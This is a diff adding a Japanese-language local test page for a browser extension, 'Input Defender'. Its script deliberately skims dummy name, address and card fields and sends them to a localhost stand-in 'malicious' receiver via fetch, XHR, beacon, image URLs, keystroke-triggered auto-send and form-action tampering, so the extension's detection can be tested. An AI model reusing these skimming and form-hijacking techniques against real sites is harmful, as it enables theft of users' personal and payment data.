@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src http://127.0.0.1:4173 http://127.0.0.1:4174; img-src http://127.0.0.1:4174; frame-src http://127.0.0.1:4173 http://127.0.0.1:4174; form-action http://127.0.0.1:4173 http://127.0.0.1:4174; base-uri 'none'">
+  <title>Input Defender · 危険挙動のローカルテスト</title>
+  <style>
+    :root { font: 14px/1.65 system-ui, "Yu Gothic UI", sans-serif; color: #273d32; background: #f5f7f3; }
+    * { box-sizing: border-box; }
+    body { margin: 0; }
+    header { padding: 14px 24px; border-bottom: 1px solid #d7dfd4; background: #fff; }
+    header div, main { max-width: 1020px; margin: 0 auto; }
+    h1 { font-size: 18px; margin: 0; }
+    h2 { font-size: 15px; margin: 0 0 8px; }
+    h3 { font-size: 13px; margin: 0 0 7px; }
+    p { margin: 6px 0; }
+    main { padding: 18px 24px 32px; }
+    .notice { border: 1px solid #dfc08f; border-left: 4px solid #a94c37; background: #fff7e8; border-radius: 6px; padding: 11px 14px; }
+    .small { font-size: 12px; color: #5c6a5f; }
+    .layout { display: grid; grid-template-columns: minmax(250px, .8fr) minmax(340px, 1.2fr); gap: 16px; margin-top: 16px; align-items: start; }
+    .panel { background: #fff; border: 1px solid #d7dfd4; border-radius: 6px; padding: 16px; }
+    .step { color: #53715b; font-size: 12px; font-weight: 700; margin: 0 0 3px; }
+    label { display: block; font-size: 12px; font-weight: 600; margin-top: 13px; }
+    input { display: block; width: 100%; margin-top: 5px; border: 1px solid #bdcbb9; padding: 9px 10px; border-radius: 5px; color: #263b2f; background: #fff; font: inherit; }
+    button { font: inherit; font-size: 12px; min-height: 34px; border: 1px solid #bdcbb9; border-radius: 5px; padding: 6px 11px; background: #fff; color: #31523c; cursor: pointer; }
+    button:disabled { background: #edf0eb; color: #7c847a; border-color: #d8ded4; cursor: not-allowed; }
+    button:focus-visible, input:focus-visible, a:focus-visible { outline: 2px solid #285b40; outline-offset: 2px; }
+    .danger { background: #a73e31; border-color: #a73e31; color: #fff; }
+    .actions { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
+    .scenario + .scenario { border-top: 1px solid #e2e7dd; margin-top: 14px; padding-top: 14px; }
+    .state { display: inline-block; font-size: 11px; padding: 2px 7px; margin-left: 5px; border-radius: 3px; color: #4f6252; background: #edf2e9; }
+    .state.active { background: #fce5de; color: #973d2b; }
+    .result { margin-top: 16px; }
+    .section-title { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+    .section-title h2 { margin: 0; }
+    #log { padding-left: 22px; margin-bottom: 0; }
+    #log li { margin: 7px 0; font-size: 12px; overflow-wrap: anywhere; }
+    #log li:first-child { font-weight: 600; }
+    code { font: 12px/1.7 ui-monospace, monospace; overflow-wrap: anywhere; }
+    [hidden] { display: none !important; }
+    @media (max-width: 760px) { .layout { grid-template-columns: 1fr; } header { padding: 12px 16px; } main { padding: 14px 16px 24px; } }
+  </style>
+</head>
+<body>
+  <header><div><h1>Input Defender · 危険挙動のローカルテスト</h1><p class="small">ダミー情報を読み取って送信する、テスト専用のページです。</p></div></header>
+  <main>
+    <div class="notice"><strong>本物の個人情報は入力しないでください。</strong><p class="small">このページのテストコードは入力値を読み取ります。拡張本体は読み取りません。送信先はこの端末の <code>127.0.0.1:4174</code> に限定し、受信した値は保存せず破棄します。</p></div>
+    <div id="launch-help" class="panel result" hidden><h2>ローカルサーバーから開いてください</h2><p><code>npm run demo</code> を実行し、<a href="http://127.0.0.1:4173/attack-lab.html">http://127.0.0.1:4173/attack-lab.html</a> をChromeで開きます。ファイルを直接開いた場合、テスト操作は無効です。</p></div>
+    <p class="small result">先に拡張を有効にしてください。「検知のみ」と「要注意の送信を停止」で結果を比較できます。このページはHTTPのため、開いた直後から暗号化されないフォームの警告が出るのは想定どおりです。</p>
+    <p class="small">通知は上からFATAL（紫）→ CRITICAL（赤）→ WARNING（黄）の順です。フォーム送信先の変更はFATAL、入力直後の外部送信はCRITICAL、HTTPはWARNINGとして、別々の通知に表示されます。漏えいや悪意の確定を意味する深刻度ではありません。</p>
+    <div class="layout">
+      <section class="panel"><p class="step">1 · ダミー情報を用意</p><h2>テスト用フォーム</h2><p class="small">初期値のまま試せます。入力直後の検知を試すときは、どれかの欄を実際に編集してください。</p>
+        <form id="lab-form" action="http://127.0.0.1:4173/lab/collect?kind=form" method="post" target="lab-receiver" autocomplete="off">
+          <label for="lab-name">氏名（ダミー）<input id="lab-name" name="full-name" autocomplete="off" value="テスト 太郎"></label>
+          <label for="lab-address">住所（ダミー）<input id="lab-address" name="address" autocomplete="off" value="テスト県テスト市 1-2-3"></label>
+          <label for="lab-card">カード番号（公開テスト用）<input id="lab-card" name="card-number" autocomplete="off" inputmode="numeric" value="4242424242424242"></label>
+          <div class="actions"><button id="reset-dummy" type="button" data-lab-action>ダミーに戻す</button></div>
+        </form>
+        <p class="small result">送信先: <code id="form-destination">127.0.0.1:4173（元の送信先）</code></p>
+        <p class="small">別ポートの <code>4174</code> を、悪意ある外部サイトの代わりに使います。</p>
+      </section>
+      <section class="panel"><p class="step">2 · 危険な動きを実行</p><h2>検知する挙動を選ぶ</h2>
+        <div class="scenario"><h3>入力中に、送信ボタンを押さずに送る <span id="auto-state" class="state">停止中</span></h3><p class="small">開始後に左の欄を編集すると、値を読み取り、少し遅れて自動送信します。最も分かりやすいテストです。</p><div class="actions"><button id="auto-start" class="danger" data-lab-action>自動送信を開始</button><button id="auto-stop" disabled data-lab-action>自動送信を停止</button></div></div>
+        <div class="scenario"><h3>入力値を手動で読み取って送る</h3><p class="small">直前に欄を編集し、5秒以内に押してください。手段ごとの警告・停止を確認できます。</p><div class="actions"><button id="lab-fetch" data-lab-action>Fetchで送信</button><button id="lab-xhr" data-lab-action>XHRで送信</button><button id="lab-beacon" data-lab-action>Beaconで送信</button><button id="lab-image" data-lab-action>画像URLに埋めて送信</button></div></div>
+        <div class="scenario"><h3>フォームの送信先を後から差し替える</h3><p class="small">「送信先を改ざん」は変更だけを行います。実際の送信は隣のボタンで試します。</p><div class="actions"><button id="lab-tamper" data-lab-action>送信先を改ざん</button><button id="lab-submit" data-lab-action>現在の送信先へフォーム送信</button></div></div>
+      </section>
+    </div>
+    <section class="panel result"><p class="step">3 · 結果を確認</p><div class="section-title"><h2>このページの実行結果</h2><button id="clear-log" disabled>表示をクリア</button></div><p class="small">送信処理の結果だけを表示し、入力値はログに出しません。警告理由や停止記録は拡張アイコンの「検知記録」で確認してください。</p><ol id="log" aria-live="polite"><li id="empty-log">操作待ち</li></ol></section>
+    <iframe name="lab-receiver" id="lab-receiver" title="ローカルフォーム送信の受信確認" hidden></iframe>
+  </main>
+  <script>
+    "use strict";
+    // Intentionally unsafe SITE behavior for a local defensive test. Never bundled with the extension.
+    const SOURCE = "http://127.0.0.1:4173";
+    const RECEIVER = "http://127.0.0.1:4174";
+    const form = document.getElementById("lab-form");
+    const log = document.getElementById("log");
+    const fields = ["lab-name", "lab-address", "lab-card"].map(id => document.getElementById(id));
+    let auto = false, timer = null, submitTimer = null;
+    const images = new Set();
+    const local = location.origin === SOURCE;
+    if (!local) {
+      document.getElementById("launch-help").hidden = false;
+      document.querySelectorAll("[data-lab-action]").forEach(button => { button.disabled = true; button.title = "ローカルサーバーから開くと使えます"; });
+    }
+    function addLog(kind, outcome) {
+      document.getElementById("empty-log")?.remove();
+      const item = document.createElement("li");
+      item.textContent = `${new Date().toLocaleTimeString("ja-JP")} · ${kind}: ${outcome}`;
+      log.prepend(item);
+      while (log.children.length > 30) log.lastElementChild.remove();
+      document.getElementById("clear-log").disabled = false;
+    }
+    // Deliberately reads the form. Values exist only for the site's current request, never in logs or storage.
+    function stealDummyValues() { return JSON.stringify({name: fields[0].value, address: fields[1].value, card: fields[2].value}); }
+    function endpoint(kind) { return `${RECEIVER}/lab/collect?kind=${kind}`; }
+    function failed(kind, error) {
+      addLog(kind, error.name === "SecurityError" ? "拡張によって送信処理が停止されました。" : "受信を確認できませんでした。サーバーと拡張の記録を確認してください。");
+    }
+    async function sendFetch(kind = "Fetch") {
+      if (!local) return;
+      try {
+        const response = await fetch(endpoint("fetch"), {method: "POST", body: stealDummyValues(), credentials: "omit"});
+        if (!response.ok) throw new Error("Receiver unavailable");
+        await response.text();
+        addLog(kind, "ローカル受信先に届き、内容は破棄されました。");
+      } catch (error) { failed(kind, error); }
+    }
+    document.getElementById("lab-fetch").addEventListener("click", () => sendFetch());
+    document.getElementById("lab-xhr").addEventListener("click", () => {
+      if (!local) return;
+      try {
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", endpoint("xhr"));
+        xhr.onload = () => addLog("XHR", xhr.status === 200 ? "ローカル受信先に届き、内容は破棄されました。" : "受信を確認できませんでした。");
+        xhr.onerror = () => failed("XHR", {name: "NetworkError"});
+        xhr.send(stealDummyValues());
+      } catch (error) { failed("XHR", error); }
+    });
+    document.getElementById("lab-beacon").addEventListener("click", () => {
+      if (!local) return;
+      try {
+        const accepted = navigator.sendBeacon(endpoint("beacon"), stealDummyValues());
+        addLog("Beacon", accepted ? "ブラウザが送信を受け付けました。受信完了はこの手段では確認できません。" : "送信は受け付けられませんでした。拡張による停止などが考えられます。");
+      } catch (error) { failed("Beacon", error); }
+    });
+    document.getElementById("lab-image").addEventListener("click", () => {
+      if (!local) return;
+      const image = new Image();
+      images.add(image);
+      image.onload = () => { images.delete(image); addLog("画像URL", "入力値を含むURLがローカル受信先に届き、内容は破棄されました。"); };
+      image.onerror = () => { images.delete(image); failed("画像URL", {name: "NetworkError"}); };
+      image.src = `${endpoint("image")}&payload=${encodeURIComponent(stealDummyValues())}`;
+    });
+    document.getElementById("auto-start").addEventListener("click", () => {
+      if (!local) return;
+      auto = true;
+      document.getElementById("auto-start").disabled = true;
+      document.getElementById("auto-stop").disabled = false;
+      document.getElementById("auto-state").textContent = "自動送信中";
+      document.getElementById("auto-state").classList.add("active");
+      addLog("自動送信", "開始しました。左の入力欄を編集してください。");
+      fields[0].focus();
+    });
+    function stopAuto() {
+      auto = false;
+      clearTimeout(timer);
+      document.getElementById("auto-start").disabled = !local;
+      document.getElementById("auto-stop").disabled = true;
+      document.getElementById("auto-state").textContent = "停止中";
+      document.getElementById("auto-state").classList.remove("active");
+    }
+    document.getElementById("auto-stop").addEventListener("click", () => { stopAuto(); addLog("自動送信", "停止しました。以後の入力では自動送信しません。"); });
+    for (const field of fields) field.addEventListener("input", () => {
+      if (!auto) return;
+      clearTimeout(timer);
+      timer = setTimeout(() => sendFetch("入力中の自動送信"), 350);
+    });
+    document.getElementById("reset-dummy").addEventListener("click", () => {
+      stopAuto();
+      form.reset();
+      form.action = `${SOURCE}/lab/collect?kind=form`;
+      document.getElementById("form-destination").textContent = "127.0.0.1:4173（元の送信先）";
+      addLog("フォーム", "ダミー値と元の送信先に戻しました。入力直後の検知には欄を実際に編集してください。");
+    });
+    document.getElementById("lab-tamper").addEventListener("click", () => {
+      if (!local) return;
+      form.action = endpoint("form");
+      document.getElementById("form-destination").textContent = "127.0.0.1:4174（改ざん後の送信先）";
+      addLog("フォーム改ざん", "送信先を別ポートに差し替えました。まだフォームは送信していません。");
+    });
+    document.getElementById("lab-submit").addEventListener("click", () => {
+      if (!local) return;
+      clearTimeout(submitTimer);
+      addLog("フォーム送信", "送信を試みます。停止された場合は拡張の記録を確認してください。");
+      // Native submission actually transfers the dummy form values to the local receiver.
+      form.requestSubmit();
+      submitTimer = setTimeout(() => addLog("フォーム送信", "受信確認はまだありません。停止・通信失敗の区別は拡張の記録で確認してください。"), 1500);
+    });
+    window.addEventListener("message", event => {
+      if (event.source !== document.getElementById("lab-receiver").contentWindow || ![SOURCE, RECEIVER].includes(event.origin)) return;
+      if (event.data?.source !== "input-defender-local-receiver" || event.data?.kind !== "form") return;
+      clearTimeout(submitTimer);
+      addLog("フォーム送信", "ローカル受信先に届き、内容は破棄されました。");
+    });
+    document.getElementById("clear-log").addEventListener("click", () => {
+      const empty = document.createElement("li");
+      empty.id = "empty-log";
+      empty.textContent = "操作待ち";
+      log.replaceChildren(empty);
+      document.getElementById("clear-log").disabled = true;
+    });
+    window.addEventListener("pagehide", stopAuto);
+  </script>
+</body>
+</html>
